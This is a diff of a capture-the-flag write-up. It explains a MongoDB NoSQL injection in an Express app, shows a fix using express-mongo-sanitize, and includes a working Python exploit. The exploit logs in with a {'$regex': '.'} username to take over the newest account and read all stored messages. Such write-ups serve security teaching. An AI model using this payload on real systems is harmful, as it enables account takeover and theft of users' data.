@@ -12,7 +12,7 @@ This was my first CTF and I will try to explain a vulnerability I fixed and expl
 
 ## Setup 
 
-During the CTF I connected to the server with VSCode, which meant I had instant access to all files and could edit them without changing between multiple ssh windows with `nano` editors.
+During the CTF I [connected to the server with VSCode](https://code.visualstudio.com/docs/remote/ssh), which meant I had instant access to all files and could edit them without changing between multiple ssh windows with `nano` editors.
 
 Also the extensions: 
  - [Docker](https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-docker):
@@ -22,7 +22,7 @@ Also the extensions:
  - [Python](https://marketplace.visualstudio.com/items?itemName=ms-python.python)
    For writing the exploit in a simple jupyter notebook. 
 
-Allowed for a hassle free search for vulnerabilities
+allowed for a hassle free search for vulnerabilities
 
 ## Stonksexchange Vulnerability
 
@@ -43,7 +43,8 @@ router.post('/register', function (req, res, next) {
   }
   var db = req.app.locals.db;
   /*
-   * Notice the findOne() function below which gets the data directly from the request body
+   * Notice the findOne() function below which 
+   * gets the data directly from the request body
    */
   db.collection('users').findOne({ 'username': req.body.username }).then(results => {
     if (results) {
@@ -80,28 +81,21 @@ I didn't use the package recommended there, but instead used [express-mongo-sani
 ```javascript
 // app.js
 
-var createError = require('http-errors');
-var express = require('express');
-var path = require('path');
-var cookieParser = require('cookie-parser');
-var logger = require('morgan');
-var session = require('express-session');
 /**
   * Adding the following line to load the sanitizer
   */
 const mongoSanitize = require('express-mongo-sanitize');
-const MongoClient = require('mongodb').MongoClient;
 
 // ...
 
 app.use(logger('dev'));
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
+
 /**
   * Use the sanitizer.
   */
 app.use(mongoSanitize());
-
 app.use(cookieParser());
 ```
 
@@ -117,7 +111,7 @@ Looking into the database we can see messages with flags. But how to retrieve th
 
 ![image](https://user-images.githubusercontent.com/13590797/115124821-952b9580-9fc4-11eb-8d4c-b5b1a75ed2ca.png)
 
-Having a look at the `/messages` function we can see that `req.session.user` is used without sanitizing it, which means if we can put an Operator like `{$regex: "."}` there (which matches any character), we can retrieve the first 50 messages of the database. 
+Having a look at the `/messages` endpoint we can see that `req.session.user` is used without sanitizing it, which means if we can put an Operator like `{"$regex": "."}` there (which matches any character and thus any user), we can retrieve the first 50 messages of the database. 
 ```javascript
 router.get('/messages', function (req, res, next) {
   if (!req.session.user) {
@@ -149,7 +143,8 @@ router.post('/login', function (req, res) {
   }
   var db = req.app.locals.db;
   /**
-    * The first user matching the username is returned, if the username is a query like {$regex: "."} we have to consider the sort function.
+    * The first user matching the username is returned, 
+    * if the username is a query like {"$regex": "."} we have to consider the sort function.
     */
   db.collection('users').findOne({ 'username': req.body.username }, { 'sort': { '$natural': -1 } }).then(results => {
     if (!results) {
@@ -168,11 +163,11 @@ router.post('/login', function (req, res) {
 });
 ```
 
-Viewing the `/login` enpoint we can see that the first user matching the query will be returned. As we want the username to be `{$regex: "."}` we have to consider the ([natural](https://docs.mongodb.com/v4.2/reference/glossary/#term-natural-order)) sort order. 
+Viewing the `/login` enpoint we can see that the first user matching the query will be returned. As we want the username to be `{"$regex": "."}` we have to consider the ([natural](https://docs.mongodb.com/v4.2/reference/glossary/#term-natural-order)) sort order. 
 
 ![image](https://user-images.githubusercontent.com/13590797/115125463-7d561080-9fc8-11eb-84fe-eb8049f2791f.png)
 
-In this case it will always be last created user. For a successful login we have to know the password. What better way to just creat one?
+In this case `findOne` will always return the last created user. For a successful login we have to know the password of the user. What better way to just create one?
 
 Lets put it together in a python script:
 
@@ -182,17 +177,20 @@ base = "http://localhost:8199"
 
 # Prepare the exploit by creating a user with a password we know
 prepare = requests.Session()
-register = prepare.post(base + '/register', json={ 'username': "0a", "password": "masterpass" })
+register = prepare.post(base + '/register', json={ 'username': "sdfsdf", "password": "masterpass" })
+# This status code should be 200
+print(register.status_code)
 
 # Create the exploit Session
 exploit = requests.Session()
 # Login with the query we want to execute
 register = exploit.post(base + '/login', json={ 'username': {"$regex": "."}, "password": "masterpass" })
+# This status code should be 200
 print(register.status_code)
 
 # Get all messages
 messages = exploit.get(base + "/messages")
-print(messages)
+print(messages.content)
 ```
 
 > During the CTF new users where created from other people exploiting the service, which meant that in order to login with all matching regex a new user had to be created each time. 
